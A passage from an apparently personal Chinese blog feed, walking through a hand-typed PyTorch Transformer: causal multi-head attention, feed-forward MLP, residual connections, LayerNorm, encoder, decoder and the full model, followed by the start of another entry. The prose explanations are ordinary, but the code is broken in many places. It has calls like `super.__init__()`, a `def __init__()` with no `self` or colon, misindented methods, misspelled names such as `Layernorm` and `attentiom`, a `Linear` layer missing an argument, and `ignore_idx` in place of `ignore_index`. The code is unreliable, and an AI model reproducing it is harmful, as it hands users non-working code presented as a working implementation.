dim x dim（head_dim = dim / n_heads）</span><br>        <span class="hljs-variable language_">self</span>.wo = nn.Linear(<span class="hljs-variable language_">self</span>.n_heads * <span class="hljs-variable language_">self</span>.head_dim, bias = <span class="hljs-literal">False</span>)<br>        <span class="hljs-comment"># 注意力的 dropout</span><br>        <span class="hljs-variable language_">self</span>.attn_dropout = nn.Dropout(args.dropout)<br><br>        <span class="hljs-comment"># 残差连接的 dropout</span><br>        <span class="hljs-variable language_">self</span>.resid_dropout = nn.Dropout(args.dropout)<br><br>        <span class="hljs-variable language_">self</span>.is_causal = is_causal<br><br>        <span class="hljs-comment"># 创建一个上三角矩阵，用于遮蔽未来信息</span><br>        <span class="hljs-comment"># 注意，因为是多头注意力，Mask 矩阵比之前我们定义的多一个维度</span><br><br>        <span class="hljs-keyword">if</span> is_causal:<br>            mask = torch.full((<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,args.max_seq_len,args.max_seq_len),<span class="hljs-built_in">float</span>(<span class="hljs-string">&quot;-inf&quot;</span>))<br>            mask = torch.triu(mask,diagonal=<span class="hljs-number">1</span>)<br>            <br>            <span class="hljs-comment"># 注册为模型的缓冲区</span><br>            <span class="hljs-variable language_">self</span>.register_buffer(<span class="hljs-string">&quot;mask&quot;</span>,mask)<br><br>        <span class="hljs-keyword">def</span> <span class="hljs-title function_">forward</span>(<span class="hljs-params">self,q:torch.Tensor,k:torch.Tensor,v:torch.Tensor</span>):<br>            <span class="hljs-comment"># 获取批次大小和序列长度，[batch_size, seq_len, dim]</span><br>            bsz, seqlen, _ = q.shape<br>            <br>            <span class="hljs-comment"># 计算查询（Q）、键（K）、值（V）,输入通过参数矩阵层，维度为 (B, T, n_embed) x (n_embed, dim) -&gt; (B, T, dim)</span><br>            xq,xk,xv = <span class="hljs-variable language_">self</span>.wq(q),<span class="hljs-variable language_">self</span>.wk(k),<span class="hljs-variable language_">self</span>.wv(v)<br>        <br>        <span class="hljs-comment"># 将 Q、K、V 拆分成多头，维度为 (B, T, n_head, dim // n_head)，然后交换维度，变成 (B, n_head, T, dim // n_head)</span><br>        <span class="hljs-comment"># 因为在注意力计算中我们是取了后两个维度参与计算</span><br>        <span class="hljs-comment"># 为什么要先按B*T*n_head*C//n_head展开再互换1、2维度而不是直接按注意力输入展开，是因为view的展开方式是直接把输入全部排开，</span><br>        <span class="hljs-comment"># 然后按要求构造，可以发现只有上述操作能够实现我们将每个头对应部分取出来的目标</span><br><br>            xq = xq.view(bsz,seqlen,<span class="hljs-variable language_">self</span>.n_heads,<span class="hljs-variable language_">self</span>.head_dim)<br>            xk = xk.view(bsz,seqlen,<span class="hljs-variable language_">self</span>.n_heads,<span class="hljs-variable language_">self</span>.head_dim)<br>            xv = xv.view(bsz,seqlen,<span class="hljs-variable language_">self</span>.n_heads,<span class="hljs-variable language_">self</span>.head_dim)<br><br>            xq = xq.transpose(<span class="hljs-number">1</span>,<span class="hljs-number">2</span>)<br>            xk = xk.transpose(<span class="hljs-number">1</span>,<span class="hljs-number">2</span>)<br>            xv = xv.transpose(<span class="hljs-number">1</span>,<span class="hljs-number">2</span>)<br>            <span class="hljs-comment"># 注意力计算</span><br>        <span class="hljs-comment"># 计算 QK^T / sqrt(d_k)，维度为 (B, nh, T, hs) x (B, nh, hs, T) -&gt; (B, nh, T, T)</span><br>            scores = torch.matmul(xq,xk.transpose(<span class="hljs-number">2</span>,<span class="hljs-number">3</span>)) / math.sqrt(<span class="hljs-variable language_">self</span>.head_dim)<br>            <span class="hljs-comment"># 掩码自注意力必须有注意力掩码</span><br>            <span class="hljs-keyword">if</span> <span class="hljs-variable language_">self</span>.is_causal:<br>                <span class="hljs-keyword">assert</span> <span class="hljs-built_in">hasattr</span>(<span class="hljs-variable language_">self</span>,<span class="hljs-string">&#x27;mask&#x27;</span>)<br><br>                <span class="hljs-comment"># 这里截取到序列长度，因为有些序列可能比 max_seq_len 短</span><br>                scores = scores + <span class="hljs-variable language_">self</span>.mask[:,:,:seqlen,:seqlen]<br><br>            <span class="hljs-comment"># 计算 softmax，维度为 (B, nh, T, T)</span><br>            scores = F.softmax(scores.<span class="hljs-built_in">float</span>(),dim=-<span class="hljs-number">1</span>).type_as(xq)<br>            <span class="hljs-comment"># 做 Dropout</span><br>            scores = <span class="hljs-variable language_">self</span>.attn_dropout(scores)<br>            <span class="hljs-comment"># V * Score，维度为(B, nh, T, T) x (B, nh, T, hs) -&gt; (B, nh, T, hs)</span><br>            output = torch.matmul(scores,xv)<br><br>            <span class="hljs-comment"># 恢复时间维度并合并头。</span><br>        <span class="hljs-comment"># 将多头的结果拼接起来, 先交换维度为 (B, T, n_head, dim // n_head)，再拼接成 (B, T, n_head * dim // n_head)</span><br>        <span class="hljs-comment"># contiguous 函数用于重新开辟一块新内存存储，因为Pytorch设置先transpose再view会报错，</span><br>        <span class="hljs-comment"># 因为view直接基于底层存储得到，然而transpose并不会改变底层存储，因此需要额外存储</span><br>            output = output.transpose(<span class="hljs-number">1</span>,<span class="hljs-number">2</span>).contiguous().view(bsz,seqlen,-<span class="hljs-number">1</span>)<br><br>            <span class="hljs-comment"># 最终投影回残差流。</span><br>            output = <span class="hljs-variable language_">self</span>.wo(output)<br>            output = <span class="hljs-variable language_">self</span>.resid_dropout(output)<br><br>            <span class="hljs-keyword">return</span> output<br></code></pre></td></tr></table></figure><p>此时通过<code>attention</code>我们得到了包含语义，位置，上下文信息的token向量表示，但是不管多复杂，这些都是<code>线性</code>的，不能做复杂的<strong>非线性特征提取</strong>，因此需要加入一层<code>FNN</code>(前馈神经网络)，引入非线性(激活函数)，增强模型表达能力，类似于传统<code>MLP</code></p><p>代码实现</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 前馈神经网络 FNN</span><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">MLP</span>(nn.Module):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>()<br>        <span class="hljs-built_in">super</span>.__init__()<br>        <span class="hljs-comment"># 定义第一层线性变换，从输入维度到隐藏维度</span><br>        <span class="hljs-variable language_">self</span>.w1 = nn.Linear(dim,hidden_dim,bias=<span class="hljs-literal">False</span>)<br>        <span class="hljs-comment"># 定义第二层线性变换，从隐藏维度到输入维度</span><br>        <span class="hljs-variable language_">self</span>.w2 = nn.Linear(hidden_dim,dim,bias=<span class="hljs-literal">False</span>)<br>        <span class="hljs-comment"># 定义dropout层，用于防止过拟合</span><br>        <span class="hljs-variable language_">self</span>.dropout = nn.Dropout(dropout)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">forward</span>(<span class="hljs-params">self,x</span>):<br>        <span class="hljs-comment"># 前向传播函数</span><br>        <span class="hljs-comment"># 首先，输入x通过第一层线性变换和RELU激活函数</span><br>        <span class="hljs-comment"># 最后，通过第二层线性变换和dropout层</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">self</span>.dropout(<span class="hljs-variable language_">self</span>.w2(F.relu(<span class="hljs-variable language_">self</span>.w1(x))))<br></code></pre></td></tr></table></figure><p>随着神经网络层数的不断叠加，在反向传播的过程中，根据<strong>链式法则</strong>，梯度会不断与各层的导数相乘。当这些导数的模长期<code>大于 1</code>或<code>小于 1</code>时，梯度便会呈指数级增长或衰减，从而分别引发<strong>梯度爆炸</strong>或<strong>梯度消失</strong>问题，使得深层网络难以稳定训练，而<code>add&amp;norm</code>就是在解决这个问题</p><p>其中，<code>add</code>代表<strong>残差连接</strong>(residual connection)</p><p><code>y = x + Sublayer(x)</code></p><p>在反向传播时，即使子层本身的梯度很小或很大，梯度仍然可以通过残差路径(<strong>Sublayer</strong>)直接传递，从而有效缓解梯度消失和梯度爆炸的问题，并使深层网络更容易优化，毕竟x的导数永远是1，使得梯度在传播过程中至少保留一条不发生缩放的通路！</p><p>从数学角度看，设L为损失函数：</p><p><img src="/images/53.png" alt="如图"></p><p>即使子层的梯度趋近于0，梯度仍然可以通过恒等映射项1直接回传，从而避免梯度完全消失；而当子层梯度过大时，残差结构也能在一定程度上缓冲梯度的剧烈变化，使训练过程更加稳定，这也是ai发展中里程碑式的一层！</p><p>稍微有点抽象，可以多理解理解…</p><p>代码实现：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 残差连接 resnet residual connection 防止深层网络叠加下的梯度消失/梯度爆炸</span><br>h = x + <span class="hljs-variable language_">self</span>.attentiom.forward(<span class="hljs-variable language_">self</span>.attention_norm(x))<br><br>out = h + <span class="hljs-variable language_">self</span>.feed_forward.forward(<span class="hljs-variable language_">self</span>.fnn_norm(h))<br></code></pre></td></tr></table></figure><p>而<code>norm</code>通常采用<code>layer norm</code>(<code>batch norm</code>我不会，不讲了！)</p><p>对每个token的特征维度进行<strong>归一化处理</strong>，使其均值为0，方差为1，稳定各层的激活分布，防止数值随着层数加深而漂移，提高训练过程的稳定性和收敛速度</p><p><img src="/images/52.png" alt="如图"></p><p>代码实现：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 层归一化(layer norm)</span><br><span class="hljs-comment"># 批归一化(batch norm)</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">LayerNorm</span>(nn.Module):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self,features,eps=<span class="hljs-number">1e-6</span></span>):<br>        <span class="hljs-built_in">super</span>.__init__()<br><br>        <span class="hljs-comment"># 线性矩阵做映射</span><br>        <span class="hljs-variable language_">self</span>.a_2 = nn.Parameter(torch.ones(features))<br><br>        <span class="hljs-variable language_">self</span>.b_2 = nn.Parameter(torch.zeros(features))<br>        <span class="hljs-variable language_">self</span>.eps = eps<br><br>        <span class="hljs-keyword">def</span> <span class="hljs-title function_">forward</span>(<span class="hljs-params">self,x</span>):<br><br>            <span class="hljs-comment"># 在统计每个样本所有维度的值，求均值和方差</span><br>            mean = x.mean(-<span class="hljs-number">1</span>,keepdim=<span class="hljs-literal">True</span>) <span class="hljs-comment"># mean: [bsz, max_len, 1]</span><br>            std = x.std(-<span class="hljs-number">1</span>,keepdim=<span class="hljs-literal">True</span>) <span class="hljs-comment"># std: [bsz, max_len, 1]</span><br><br>            <span class="hljs-comment"># 注意这里也在最后一个维度发生了广播</span><br>            <span class="hljs-keyword">return</span> <span class="hljs-variable language_">self</span>.a_2 * (x-mean) / (std+<span class="hljs-variable language_">self</span>.eps) + <span class="hljs-variable language_">self</span>.b_2<br></code></pre></td></tr></table></figure><p>将这些串联起来，我们就能写出encoder layer和decoder layer了，而n个这样的layer便组成了完整的encoder和decoder！</p><p>代码如下，需要注意一些细节，自己注意一下吧，毕竟，<code>attention is all you need!</code>…</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># encoder</span><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">EncoderLayer</span>(nn.Module):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self,args</span>):<br>        <span class="hljs-built_in">super</span>.__init__()<br>        <span class="hljs-comment"># 一个 Layer 中有两个 LayerNorm，分别在 Attention 之前和 MLP 之前</span><br>        <span class="hljs-variable language_">self</span>.attention_norm = Layernorm(args.n_embd)<br>        <span class="hljs-comment"># Encoder 不需要掩码，传入 is_causal=False</span><br>        <span class="hljs-variable language_">self</span>.attention = MultiHeadAttention(args,is_causal=<span class="hljs-literal">False</span>)<br>        <span class="hljs-variable language_">self</span>.fnn_norm = LayerNorm(args,n_embd)<br>        <span class="hljs-variable language_">self</span>.feed_forward = MLP(args.dim,args.dim,dropout)<br><br>    <br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">forward</span>(<span class="hljs-params">self,x</span>):<br>        <span class="hljs-comment"># Layer Norm</span><br>        norm_x = <span class="hljs-variable language_">self</span>.attention_norm(x)<br>        <span class="hljs-comment"># 自注意力</span><br>        h = x + <span class="hljs-variable language_">self</span>.attention_forward(norm_x,norm_x,norm_x)<br>        <span class="hljs-comment"># 经过前馈神经网络</span><br>        out = h + <span class="hljs-variable language_">self</span>.feed_forward.forward(<span class="hljs-variable language_">self</span>.fnn_norm(h))<br><br>        <span class="hljs-keyword">return</span> out<br>    <br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Encoder</span>(nn.Module):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self,args</span>):<br>        <span class="hljs-built_in">super</span>(Encoder,<span class="hljs-variable language_">self</span>).__init__()<br><br>        <span class="hljs-comment"># 一个 Encoder 由 N 个 Encoder Layer 组成</span><br>        <span class="hljs-variable language_">self</span>.layers = nn.ModuleList([EncoderLayer(args) <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(args.n_layer)])<br>        <span class="hljs-variable language_">self</span>.norm = LayerNorm(args.n_embd)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">forward</span>(<span class="hljs-params">self,x</span>):<br>        <span class="hljs-keyword">for</span> layer <span class="hljs-keyword">in</span> <span class="hljs-variable language_">self</span>.layers:<br>            x = layer(x)<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">self</span>.norm(x)<br>    <br><br><span class="hljs-comment"># decoder</span><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">DecoderLayer</span>(nn.Module):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self,args</span>):<br>        <span class="hljs-built_in">super</span>().__init__()<br>        <span class="hljs-comment"># 一个 Layer 中有三个 LayerNorm，分别在 Mask Attention 之前、Self Attention 之前和 MLP 之前</span><br><br>        <span class="hljs-variable language_">self</span>.attention_norm_1 = LayerNorm(args.n_embd)<br>        <span class="hljs-comment"># Decoder 的第一个部分是 Mask Attention，传入 is_causal=True</span><br>        <span class="hljs-variable language_">self</span>.mask_attention = MultiHeadAttention(args,is_causal=<span class="hljs-literal">True</span>)<br>        <span class="hljs-variable language_">self</span>.attention_norm_2 = LayerNorm(args.n_embd)<br>        <span class="hljs-comment"># Decoder 的第二个部分是 类似于 Encoder 的 Attention，传入 is_causal=False</span><br><br>        <span class="hljs-variable language_">self</span>.attention = MultiHeadAttention(args,is_causal=<span class="hljs-literal">False</span>)<br><br>        <span class="hljs-variable language_">self</span>.fnn_norm = LayerNorm(args.n_embd)<br><br>        <span class="hljs-comment"># 第三个部分是 MLP</span><br>        <span class="hljs-variable language_">self</span>.feed_forward = MLP(args.dim,args.dim,dropout)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">forward</span>(<span class="hljs-params">self,x,enc_out</span>):<br>        <span class="hljs-comment"># Layer Norm</span><br>        norm_x = <span class="hljs-variable language_">self</span>.attention_norm_1(x)<br><br>        <span class="hljs-comment"># 掩码自注意力</span><br>        x = x + <span class="hljs-variable language_">self</span>.mask_attention.forward(norm_x,norm_x,norm_x)<br><br>        <span class="hljs-comment"># 多头注意力</span><br>        norm_x = <span class="hljs-variable language_">self</span>.attention_norm_2(x)<br>        h = x + <span class="hljs-variable language_">self</span>.attention.forward(norm_x,enc_out,enc_out)<br><br>        <span class="hljs-comment"># 经过前馈神经网络</span><br>        out = h + <span class="hljs-variable language_">self</span>.feed_forward.forward(<span class="hljs-variable language_">self</span>.fnn_norm(h))<br><br>        <span class="hljs-keyword">return</span> out<br>    <br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Decoder</span>(nn.Module):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self,args</span>):<br>        <span class="hljs-built_in">super</span>(Decoder,<span class="hljs-variable language_">self</span>).__init__()<br>        <span class="hljs-comment"># 一个 Decoder 由 N 个 Decoder Layer 组成</span><br><br>        <span class="hljs-variable language_">self</span>.layers = nn.ModuleList([DecoderLayer(args) <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(args.n_layer)])<br>        <span class="hljs-variable language_">self</span>.norm = LayerNorm(args.n_embd)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">forward</span>(<span class="hljs-params">self,x,enc_out</span>):<br>        <span class="hljs-keyword">for</span> layer <span class="hljs-keyword">in</span> <span class="hljs-variable language_">self</span>.layers:<br>            x = layer(x,enc_out)<br><br>        <span class="hljs-keyword">return</span>  <span class="hljs-variable language_">self</span>.norm(x)<br></code></pre></td></tr></table></figure><p>最后把所有的都结合起来，合成我们的transformer！</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 完整 transformer 模型</span><br><span class="hljs-comment"># combination</span><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Transformer</span>(nn.Module):<br>    <span class="hljs-string">&#x27;&#x27;&#x27;整体模型&#x27;&#x27;&#x27;</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self,args</span>):<br>        <span class="hljs-built_in">super</span>().__init__()<br>        <span class="hljs-comment"># 必须输入词表大小和 block size</span><br>        <span class="hljs-keyword">assert</span> args.vocab_size <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span><br>        <span class="hljs-keyword">assert</span> args.block_size <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span><br>        <span class="hljs-variable language_">self</span>.args = args<br>        <span class="hljs-variable language_">self</span>.transformer = nn.ModuleDict(<span class="hljs-built_in">dict</span>(<br>            wte = nn.Embedding(args.vocab_size,args.n_embd),<br>            wpe = PositionEncoding(args),<br>            drop = nn.Dropout(args.dropout),<br>            encoder = Encoder(args),<br>            decoder = Decoder(args),<br>        ))<br>        <span class="hljs-comment"># 最后的线性层，输入是 n_embd，输出是词表大小</span><br>        <span class="hljs-variable language_">self</span>.lm_head = nn.Linear(args.n_embd,args.vocab_size,bias=<span class="hljs-literal">False</span>)<br><br>        <span class="hljs-comment"># 初始化所有的权重</span><br>        <span class="hljs-variable language_">self</span>.apply(<span class="hljs-variable language_">self</span>._init_weights)<br><br>        <span class="hljs-comment"># 查看所有参数的数量</span><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;number of parameters: %.2fM&quot;</span> % (<span class="hljs-variable language_">self</span>.get_num_params()/<span class="hljs-number">1e6</span>,))<br>    <br>    <span class="hljs-string">&#x27;&#x27;&#x27;统计所有参数的数量&#x27;&#x27;&#x27;</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">get_num_params</span>(<span class="hljs-params">self,non_embedding=<span class="hljs-literal">False</span></span>):<br>        <span class="hljs-comment"># non_embedding: 是否统计 embedding 的参数</span><br>        n_params = <span class="hljs-built_in">sum</span>(p.numel() <span class="hljs-keyword">for</span> p <span class="hljs-keyword">in</span> <span class="hljs-variable language_">self</span>.parameters())<br><br>        <span class="hljs-comment"># 如果不统计 embedding 的参数，就减去</span><br>        <span class="hljs-keyword">if</span> non_embedding:<br>            n_params -= <span class="hljs-variable language_">self</span>.transformer.wte.weight.numel()<br>        <span class="hljs-keyword">return</span> n_params<br>    <br>    <span class="hljs-string">&#x27;&#x27;&#x27;初始化权重&#x27;&#x27;&#x27;</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">_init_weights</span>(<span class="hljs-params">self,module</span>):<br>        <span class="hljs-comment"># 线性层和 Embedding 层初始化为正则分布</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(module,nn.Linear):<br>            torch.nn.init.normal_(module.weight,mean=<span class="hljs-number">0.0</span>,std=<span class="hljs-number">0.02</span>)<br>            <span class="hljs-keyword">if</span> module.bias <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:<br>                torch.nn.init.zeros_(module.bias)<br>        <span class="hljs-keyword">elif</span> <span class="hljs-built_in">isinstance</span>(module,nn.Embedding):<br>            torch.nn.init.normal_(module.weight,mean=<span class="hljs-number">0.0</span>,std=<span class="hljs-number">0.02</span>)<br>    <br>    <span class="hljs-string">&#x27;&#x27;&#x27;前向计算函数&#x27;&#x27;&#x27;</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">forward</span>(<span class="hljs-params">self,idx,targets=<span class="hljs-literal">None</span></span>):<br>        <span class="hljs-comment"># 输入为 idx，维度为 (batch size, sequence length, 1)；targets 为目标序列，用于计算 loss</span><br>        device = idx.device<br>        b,t = idx.size()<br>        <span class="hljs-keyword">assert</span> t &lt;= <span class="hljs-variable language_">self</span>.args.block_size, <span class="hljs-string">f&quot;不能计算该序列，该序列长度为<span class="hljs-subst">&#123;t&#125;</span>，最大序列长度只有<span class="hljs-subst">&#123;self.args.block_size&#125;</span>&quot;</span><br><br>        <span class="hljs-comment"># 通过 self.transformer</span><br>        <span class="hljs-comment"># 首先将输入 idx 通过 Embedding 层，得到维度为 (batch size, sequence length, n_embd)</span><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;idx&quot;</span>,idx.size())<br><br>        <span class="hljs-comment"># 通过 Embedding 层</span><br>        tok_emb = <span class="hljs-variable language_">self</span>.transformer.wte(idx)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;tok_emb&quot;</span>,tok_emb.size())<br><br>        <span class="hljs-comment"># 然后通过位置编码</span><br>        pos_emb = <span class="hljs-variable language_">self</span>.transformer.wpe(tok_emb)<br><br>        <span class="hljs-comment"># 再进行 Dropout</span><br>        x = <span class="hljs-variable language_">self</span>.transformer.drop(pos_emb)<br><br>        <span class="hljs-comment"># 然后通过 Encoder</span><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;x after wpe : &quot;</span>,x.size())<br>        enc_out = <span class="hljs-variable language_">self</span>.transformer.encoder(x)<br><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;enc_out : &quot;</span>,enc_out.size())<br><br>        <span class="hljs-comment"># 再通过 Decoder</span><br>        x = <span class="hljs-variable language_">self</span>.transformer.decoder(x,enc_out)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;x after decoder : &quot;</span>,x.size())<br><br>        <span class="hljs-keyword">if</span> targets <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:<br>            <span class="hljs-comment"># 训练阶段，如果我们给了 targets，就计算 loss</span><br>            <span class="hljs-comment"># 先通过最后的 Linear 层，得到维度为 (batch size, sequence length, vocab size)</span><br>            logits = <span class="hljs-variable language_">self</span>.lm_head(x)<br>            <span class="hljs-comment"># 再跟 targets 计算交叉熵</span><br>            loss = F.cross_entropy(logits.view(-<span class="hljs-number">1</span>,logits.size(-<span class="hljs-number">1</span>)),targets.view(-<span class="hljs-number">1</span>),ignore_idx=-<span class="hljs-number">1</span>)<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-comment"># 推理阶段，我们只需要 logits，loss 为 None</span><br>            <span class="hljs-comment"># 取 -1 是只取序列中的最后一个作为输出</span><br>            logits = <span class="hljs-variable language_">self</span>.lm_head(x[:, [-<span class="hljs-number">1</span>], :]) <span class="hljs-comment"># note: using list [-1] to preserve the time dim</span><br>            loss = <span class="hljs-literal">None</span><br>        <span class="hljs-keyword">return</span> logits, loss<br></code></pre></td></tr></table></figure><p>实不相瞒，这些代码都是我手敲的，虽然注释是复制来的，总之，<code>hands-on</code>!</p><p>最后，AI时代，学习ai，理解ai，运用ai，让其成为你的工具，而非陷入ai是不是会取代人类的焦虑，思索…</p><p>累了，先打把瓦！</p><p>感谢阅读，生活愉快！</p>]]></content>
    
    
    <categories>
      
      <category>AI</category>
      
    </categories>
    
    
    <tags>
      
      <tag>attention</tag>
      
      <tag>transformer</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>滑动窗口</title>
    <link href="/2026/01/19/%E6%BB%91%E5%8A%A8%E7%AA%97%E5%8F%A3/"/>
    <url>/2026/01/19/%E6%BB%91%E5%8A%A8%E7%AA%97%E5%8F%A3/</url>
    
